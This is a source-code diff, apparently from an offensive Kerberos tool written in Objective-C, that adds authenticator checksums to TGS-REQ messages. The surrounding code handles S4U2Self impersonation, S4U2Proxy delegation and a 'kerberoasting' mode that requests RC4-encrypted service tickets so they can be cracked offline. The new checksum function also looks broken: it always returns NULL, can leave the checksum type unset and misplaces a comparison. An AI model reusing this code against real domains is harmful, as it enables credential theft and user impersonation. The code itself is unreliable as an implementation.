@@ -22,8 +22,9 @@ KerbGenericString* targetUser; //this is for S4U2Self only
 KerbOctetString* key12;
 KerbGenericString* requestingUser;
 NSData* innerTicket;
+KerbSequence* checksumdata;
 //standard TGS-REQ information, service should be like cifs/hostname.domain.com
--(NSData*) createAuthenticatorRealm:(KerbGenericString*)realm Principal:(KerbCNamePrincipal*) cname{
+-(NSData*) createAuthenticatorRealm:(KerbGenericString*)realm Principal:(KerbCNamePrincipal*) cname Ticket:(Krb5Ticket)ticket{
     /*
      * Application 2
             Sequence
@@ -33,10 +34,17 @@ NSData* innerTicket;
                     GeneralString - realm
                 [2]
                     principal name (cname) CNamePrincipal
+                [3]
+                    cksum (optional)
                 [4]
-                    Integer (nonce)
+                    Integer (microseconds)
                 [5]
                     GeneralizedTime (now)
+     
+     Checksum        ::= SEQUENCE {
+             cksumtype       [0] Int32,
+             checksum        [1] OCTET STRING
+     }
                 
      */
     @try{
@@ -44,8 +52,85 @@ NSData* innerTicket;
         [sequence addAsn:[[[KerbInteger alloc] initWithValue:5] collapseToAsnObject] inSpot:0];
         [sequence addAsn:[realm collapseToAsnObject] inSpot:1];
         [sequence addAsn:[cname collapseToAsnObject] inSpot:2];
-        [sequence addEmptyinSpot:3];
+        //now to calculate the checksum
+        // build out [4]
+        KerbSequence* seq4 = [[KerbSequence alloc] initWithEmpty];
+        if(self.isS4U2Proxy){
+            [seq4 addAsn:[[[KerbBitString alloc] initWithValue:KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_REQUEST_ANONYMOUS | KDC_OPT_RENEWABLE_OK] collapseToAsnObject] inSpot:0];
+        }else{
+            [seq4 addAsn:[[[KerbBitString alloc] initWithValue:KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE] collapseToAsnObject] inSpot:0];
+        }
+        
+        if(self.isS4U2Self){
+            /*
+             [1] (only for S4U2self)                                  0xA1 [length bytes]        ------- OPTIONAL start only for S4U2Self
+             SEQUENCE                                                 0x30 [length bytes]
+                 [0]                                                  0xA0 [length bytes]
+                     INTEGER 1                                        0x02 [length bytes] [value]
+                 [1]                                                  0xA1 [length bytes]
+                     SEQUENCE                                         0x30 [length bytes]
+                         GeneralString username of request user       0x1B [length bytes] [value] ------- OPTIONAL end  only for S4U2Self
+             */
+            KerbCNamePrincipal* partOneS4U = [[KerbCNamePrincipal alloc] initWithValueUsername:requestingUser.KerbGenStringvalue];
+            [seq4 addAsn:[partOneS4U collapseToAsnObject] inSpot:1];
+        }else if(self.isS4U2Proxy){
+            KerbCNamePrincipal* partOneS4U = [[KerbCNamePrincipal alloc] initWithValueUsername:NULL];
+            [seq4 addAsn:[partOneS4U collapseToAsnObject] inSpot:1];
+        }else{
+            [seq4 addEmptyinSpot:1]; //cname is left empty in TGS-REQ, used only for AS-REQ and S4U2Self
+        }
+        [seq4 addAsn:[self.serviceDomain collapseToAsnObject] inSpot:2];
+        //      parse out the service pieces for [3] of [4]
+        if(self.isS4U2Self){
+            //in an S4U2Self request, this is the targetUser we're trying to impersonate
+            [seq4 addAsn:[[[KerbCNamePrincipal alloc] initWithValueUsername:requestingUser.KerbGenStringvalue] collapseToAsnObject] inSpot:3];
+        }else{
+            //in a normal service ticket request, this piece is the SName of the principal we're requesting
+            NSArray* servicePieces = [self.service.KerbGenStringvalue componentsSeparatedByString:@"/"];
+            if( [servicePieces count] != 2){
+                printf("Service, %s, is not in the right format\n", self.service.KerbGenStringvalue.UTF8String);
+                return NULL;
+            }
+            [seq4 addAsn:[[[KerbSNamePrincipal alloc] initWithValueAccount:(NSString*)[servicePieces objectAtIndex:0] Domain:(NSString*)[servicePieces objectAtIndex:1]] collapseToAsnObject] inSpot:3];
+        }
+        
+        [seq4 addEmptyinSpot:4];
+        [seq4 addAsn:[[[KerbGeneralizedTime alloc] initWithTimeOffset:100] collapseToAsnObject] inSpot:5]; // till time of 100 days from now
+        [seq4 addEmptyinSpot:6];
         int nonce = arc4random_uniform(RAND_MAX);
+        [seq4 addAsn:[[[KerbInteger alloc] initWithValue:nonce] collapseToAsnObject] inSpot:7];
+        NSData* enctype;
+        if(self.kerberoasting){
+            enctype = [[[KerbInteger alloc] initWithValue:ENCTYPE_ARCFOUR_HMAC] collapseToNSData];
+        }else{
+            //we're not kerberoasting, so actually try to get back an aes256 service ticket
+            NSData* aes256Enc = [[[KerbInteger alloc] initWithValue:ENCTYPE_AES256_CTS_HMAC_SHA1_96] collapseToNSData];
+            NSData* aes128Enc = [[[KerbInteger alloc] initWithValue:ENCTYPE_AES128_CTS_HMAC_SHA1_96] collapseToNSData];
+            NSData* arcfour = [[[KerbInteger alloc] initWithValue:ENCTYPE_ARCFOUR_HMAC] collapseToNSData];
+            NSMutableData* typelist = [[NSMutableData alloc] init];
+            [typelist appendData:aes256Enc];
+            [typelist appendData:aes128Enc];
+            [typelist appendData:arcfour];
+            enctype = [[NSData alloc] initWithData:typelist];
+        }
+        ASN1_Obj* seq8Sequence = createCollapsedAsnBasicType(0x30, enctype);
+        [seq4 addAsn:seq8Sequence inSpot:8];
+        if(self.isS4U2Proxy){
+            [seq4 addEmptyinSpot:9];
+            [seq4 addEmptyinSpot:10];
+            ASN1_Obj* additionalTickets = createCollapsedAsnBasicType(0x30, self.innerTicket);
+            [seq4 addAsn:additionalTickets inSpot:11];
+        }
+        self.checksumdata = seq4;
+        ASN1_Obj* checksum_asn = [self calculateChecksumTicket:ticket];
+        if(checksum_asn == NULL){
+            [sequence addEmptyinSpot:3];
+        }else{
+            [sequence addAsn:checksum_asn inSpot:3];
+        }
+    
+        //[sequence addEmptyinSpot:3];
+        nonce = arc4random_uniform(RAND_MAX);
         [sequence addAsn:[[[KerbInteger alloc] initWithValue:nonce] collapseToAsnObject] inSpot:4];
         [sequence addAsn:[[[KerbGeneralizedTime alloc] initWithTimeNow] collapseToAsnObject] inSpot:5];
         NSData* collapsedSequence = [sequence collapseToNSData];
@@ -55,6 +140,45 @@ NSData* innerTicket;
         printf("Error in createAuthenticator: %s\n", exception.reason.UTF8String);
         @throw exception;
     }
+}
+-(ASN1_Obj*) calculateChecksumTicket: (Krb5Ticket)ticket{
+     /*
+        krb5_error_code KRB5_CALLCONV
+        krb5_c_make_checksum
+        (krb5_context context, krb5_cksumtype cksumtype,
+                const krb5_keyblock *key, krb5_keyusage usage,
+                const krb5_data *input, krb5_checksum *cksum)
+        */
+    krb5_checksum checksum;
+    krb5_keyusage usage;
+    krb5_data input;
+    krb5_keyblock key;
+    krb5_context context;
+    krb5_cksumtype checksumtype;
+    NSData* inData = [self.checksumdata collapseToNSData];
+    krb5_error_code ret;
+    if ((ret = krb5_init_context (&context) != 0)){
+        printf("[-] Failed to get Kerberos context for checksum generation\n");
+        return NULL;
+    }
+    if(ticket.app29.enctype29.KerbIntValue == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
+        checksumtype = CKSUMTYPE_HMAC_SHA1_96_AES256;
+    }else if(ticket.app29.enctype29.KerbIntValue == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
+        checksumtype = CKSUMTYPE_HMAC_SHA1_96_AES128;
+    }
+    key.length = ticket.app29.key.KerbOctetvalue.length;
+    key.magic = KV5M_KEYBLOCK;
+    key.enctype = ticket.app29.enctype29.KerbIntValue;
+    key.contents = malloc(key.length);
+    usage = KRB5_KEYUSAGE_TGS_REQ_AUTH_CKSUM;
+    memcpy(key.contents, ticket.app29.key.KerbOctetvalue.bytes, ticket.app29.key.KerbOctetvalue.length);
+    input.length = inData.length;
+    input.data = malloc(input.length);
+    input.magic = KV5M_CHECKSUM;
+    memcpy(input.data, inData.bytes, inData.length);
+    krb5_c_make_checksum(context, checksumtype, &key, usage, &input, &checksum);
+    KerbOctetString* checksumOctet = [[KerbOctetString alloc] initWithValue:[[NSData alloc] initWithBytes:checksum.contents length:checksum.length]];
+    return NULL;
 }
 -(NSData*) createPADataTGSReq:(Krb5Ticket) ticket{
     /*
@@ -103,7 +227,7 @@ NSData* innerTicket;
         [sequence addAsn:[[[KerbBitString alloc] initWithValue:0] collapseToAsnObject] inSpot:2];
         [sequence addAsn:[ticket.app1 collapseToAsnObject] inSpot:3];
         //get authenticator data, encrypt it, and set up piece 4 before adding
-        NSData* authenticator = [self createAuthenticatorRealm:ticket.app1.realm Principal:ticket.app29.cname];
+        NSData* authenticator = [self createAuthenticatorRealm:ticket.app1.realm Principal:ticket.app29.cname Ticket:ticket];
         //NSData* authenticator = createAuthenticator(ticket.app1.realm, ticket.app29.cname);
         NSData* encryptedData = encryptKrbData(KRB5_KEYUSAGE_TGS_REQ_AUTH, ticket.app29.enctype29.KerbIntValue, authenticator, [ticket.app29.key getHexValue]);
         KerbSequence* seqFour = [[KerbSequence alloc] initWithEmpty];
@@ -176,6 +300,7 @@ NSData* innerTicket;
 }
 //for S4U2Self
 -(NSData*) computeChecksumInData:(NSData*) inData Key:(NSData*) key{
+    
     CCHmacContext    ctx, ctx2;
     unsigned char    mac[CC_MD5_DIGEST_LENGTH];
     unsigned char    ksign[CC_MD5_DIGEST_LENGTH];
